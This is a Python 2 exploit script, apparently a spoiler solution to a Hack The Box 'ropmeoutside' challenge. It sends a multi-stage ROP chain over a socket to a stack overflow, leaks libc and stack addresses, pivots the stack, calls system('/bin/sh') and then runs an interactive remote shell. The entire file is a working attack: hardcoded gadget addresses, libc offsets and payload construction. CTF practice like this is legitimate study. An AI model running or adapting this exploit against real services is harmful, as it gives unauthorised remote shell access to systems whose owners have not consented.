#!/usr/bin/env python
'''
Solution to h@cktheb0x ropmeoutside challenge.  Spoiler!
Matt P.

'''
import struct
from time import sleep
import sys
from subprocess import *
import socket

hostname = sys.argv[1]
port = int(sys.argv[2])
libc = sys.argv[3]

#libc offsets
if libc == "2.25":
	libc_system_distance 	 = 0x40d60
	libc_start_offset	 = 0x20470 

if libc == "2.24":
	libc_system_distance 	 = 0x3f480
	libc_start_offset	 = 0x201f0 

if libc == "2.23":
	libc_system_distance  	 = 0x45390
	libc_start_offset	 = 0x20740 

def str_to_lendian(shellcode_str):
	shellcode_str = shellcode_str[::-1]
	shellcode_str = shellcode_str.encode('hex')
	shellcode_str = int(shellcode_str,16)
	return shellcode_str

def build_bytes(rop_obj):
	if type(rop_obj) is list:

		shellcode_list = [ struct.pack('<Q', i) for i in rop_obj]
		return ''.join(shellcode_list)

	elif type(rop_obj) is str:
		return str_to_lendian(rop_obj)

def read_netbytes(recv_output, outputtype):	
	sleep(.5)
	response_list = ([hex(ord(i)) for i in recv_output])[::-1]

	if outputtype == "memaddr":
		response_list = [i for i in response_list if i != '0xa']
		return int((''.join(['{:02X}'.format(int(i,16)) for i in response_list])), 16)

	if outputtype == "bytes":
		return [i for i in response_list if i != '0xa']

__libc_start_ptr     		 = 0x601020
puts 				 = 0x40063a # address to puts() function
pop_rdi				 = 0x4006d3 # pop rdi; ret
pop_rbp				 = 0x400590 # pop rbp; ret
stdin  				 = 0x40064e # jump to instruction where stdin is loaded
flush				 = 0x40063f # flush() function, writes to stdout
turtleshell = build_bytes("/bin/sh\x00")
banner = "ROP me outside, how 'about dah?\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hostname, port))

#padding prior to base pointer (rbp) overwrite
padding = []
padding.append(0x4141414141414141) #
padding.append(0x4242424242424242) #
padding.append(0x4343434343434343) #
padding.append(0x4444444444444444) #
padding.append(0x4545454545454545) #
padding.append(0x4646464646464646) #
padding.append(0x4747474747474747) #
padding.append(0x4848484848484848) #

############## ROP CHAIN 1 ##############

response1 = s.recv(len(banner))
sleep(1)
if response1 == banner:
	print "[+] Received banner."

raw_input("[+] Press enter to continue: ")

roplist1 = padding[:]
roplist1.append(0x601250)  	    # ret <--- rbp on first loop / pushed as rtn ptr
roplist1.append(0x000000000040062e) # mov DWORD PTR [rbp-0x44],edi
roplist1.append(0x0000000000400626) # <--
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #	 |
roplist1.append(0x0000000000000000) #	 |
roplist1.append(0x0000000000000000) #	 |
roplist1.append(0x0000000000000000) #	 |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |	  
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |	  
roplist1.append(0x0000000000000000) #    |--- clears stack of terminating bytes
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #    |
roplist1.append(0x0000000000000000) #	 |
roplist1.append(0x0000000000000000) # <--

ropchain1 = build_bytes(roplist1)

print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(ropchain1)
raw_input("[+] Press enter to continue: ")
s.sendall(ropchain1+"\n")
response1 = s.recv(1024)

if response1 == banner:
	print "[+] Received banner."

############## ROP CHAIN 2 ##############

roplist2 = padding[:]
roplist2.append(0x601350)    		# <-- set the base pointer to the bss section
roplist2.append(pop_rdi) 		# <-- pop libc_start into rdi for us to read 
roplist2.append(__libc_start_ptr)   	#    this will allow us to calculate libc base address 		      
roplist2.append(puts) 			# <---- loop to puts()

print "[*] Sending ze stage 2 ROP gadgets..."
sleep(.5)
ropchain2 = build_bytes(roplist2)
s.sendall(ropchain2+"\n")
response2 = s.recv(1024)
libc_start_main_leak = read_netbytes(response2, "memaddr")
print "[+] Libc Base Address at 0x%x" % libc_start_main_leak
print "[*] Doin' math 'n' shit..."

libc_base = libc_start_main_leak - libc_start_offset #get libc base
print "\t[+] Libc base at addr: %s" % hex(libc_base)

system = libc_base + libc_system_distance
print "\t[+] System syscall gadget at addr: %s" % hex(system)

raw_input("[+] Press enter to continue: ")

############## ROP CHAIN 3 ##############

roplist3 = padding[:]
roplist3.append(0x6011f0)    	    # <-- bss address that contain a pointer to the stack
roplist3.append(pop_rdi)            # <-- return to pop rdi gadget, next address into rdi
roplist3.append(0x6011f0) 	    # <-- stack pointer that goes into rdi register
roplist3.append(puts) 	            # <-- loop to puts() which will print out the stack
roplist3.append(0x4141414141414141) #	  pointer we need to pivot back to stack before 
roplist3.append(0x4141414141414141) #	  calling system
roplist3.append(0x4141414141414141) #
roplist3.append(0x4141414141414141) #
roplist3.append(0x4141414141414141) #
roplist3.append(turtleshell) 	    # <--- write '/bin/sh string' to bss to reference later
									# 	   Writing the string to stack will fail.
print "[*] Sending stage 3 to get stack leak...."
ropchain3 = build_bytes(roplist3)
s.sendall(ropchain3+"\n")
sleep(.5)

response3 =  s.recv(1024) # puts() runs with rdi set to bss address that
			  # contains the pointer back to stack
			  # Can't call system with the bss address range set
			  # as the stack so we need to pivot back

stack_pointer_leak = read_netbytes(response3, "memaddr")
print "[+] Got stack stack pointer at %s" % hex(stack_pointer_leak)
sleep(.5)

stack_pointer = stack_pointer_leak - 0x1f0 #since the leaked address is at the top of the stack
					   #we subtract 496 bytes to get back into an acceptable
					   #range so system call doesn't crash

print "[*] Pivoting back to stack at %s..." % hex(stack_pointer)
sleep(.5)

############## ROP CHAIN 4 ##############

roplist4 = padding[:]
roplist4.append(0x0000000000000000)	# <-- rbp doesn't need to be set since leave instruction will dereference
roplist4.append(pop_rbp) 		# <-- after exiting puts(), pop our stack pointer in rbp 
roplist4.append(stack_pointer)		# 	  on next run, leave; ret will dereference and return us to stack
roplist4.append(stdin) 			# <-- loop back to stdin to take in our last rop chain

ropchain4 = build_bytes(roplist4)
s.sendall(ropchain4+"\n")
sleep(.5)

############## ROP CHAIN 5 ##############

roplist5 = padding[:]
roplist5.append(stack_pointer)    	# <-- maintain rbp address with our leaked stack pointer
roplist5.append(pop_rdi) 		# <-- pop the next address that holds our '/bin/sh' string
roplist5.append(0x601398) 		# <-- address in bss that holds '/bin/sh' (turtleshell variable)
roplist5.append(system) 		# <-- pop that shell
roplist5.append(flush) 			# <-- flush stdout for good measure

print "[*] Dumping shellcode..."

ropchain5 = build_bytes(roplist5)
s.sendall(ropchain5+"\n")
sleep(.5)

############## RUN SHELL ##############

s.sendall("whoami\n")
sleep(.5)
username = s.recv(1028)
s.sendall("hostname\n")
sleep(.5)
targethost = s.recv(1028)

if not username and targethost:
	print "[-] Failed to pwn ze box :("
	exit()

else:
	print "[+] Gyot'im! Running as %s on host %s" % (username.rstrip() , targethost.rstrip())

	while True:
		shell_command = raw_input("# ")
		s.sendall(shell_command+"\n")	
		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
			s.close()
			break
		output = s.recv(2048)
		print output
		sleep(.1)
